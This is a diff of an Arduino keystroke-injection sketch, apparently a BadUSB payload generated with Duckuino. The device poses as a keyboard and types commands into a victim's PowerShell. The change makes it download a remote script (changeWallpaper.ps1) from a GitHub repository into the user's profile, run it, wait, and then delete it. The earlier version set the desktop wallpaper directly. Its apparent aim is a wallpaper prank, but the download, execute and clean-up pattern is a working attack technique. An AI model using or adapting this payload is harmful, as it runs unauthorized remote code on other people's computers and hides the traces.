@@ -3,6 +3,7 @@
  * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
  */
 
+
 #include "Keyboard.h"
 
 void typeKey(uint8_t key)
@@ -37,65 +38,19 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  delay(2000);
+  delay(1000);
   Keyboard.print(F("y"));
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print(F("echo \"wget -Uri https://github.com/MeditationDuck/badusb/blob/main/image.jpg?raw=true -outfile $env:USERPROFILE\\image.jpg"));
+  Keyboard.print(F("echo \"wget -Uri https://raw.githubusercontent.com/MeditationDuck/badusb/main/changeWallpaper.ps1 -outfile $env:USERPROFILE\\c.ps1\""));
 
   typeKey(KEY_RETURN);
 
-  Keyboard.print(F("Set-ItemProperty -path `\"HKCU:Control Panel\\Desktop`\" -name wallpaper -value $env:USERPROFILE\\image.jpg"));
+  Keyboard.print(F(".\\c.ps1"));
 
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rundll32.exe user32.dll,UpdatePerUserSystemParameters 1, True"));
-
-  typeKey(KEY_RETURN);
-
-  Keyboard.print(F("rm $env:USERPROFILE\\image.jpg\" >> change.ps1"));
-
-  typeKey(KEY_RETURN);
-
-  delay(2000);
-  Keyboard.print(F(".\\change.ps1"));
+  delay(100000);
+  Keyboard.print(F("rm $env:USERPROFILE\\c.ps1"));
 
   typeKey(KEY_RETURN);
 
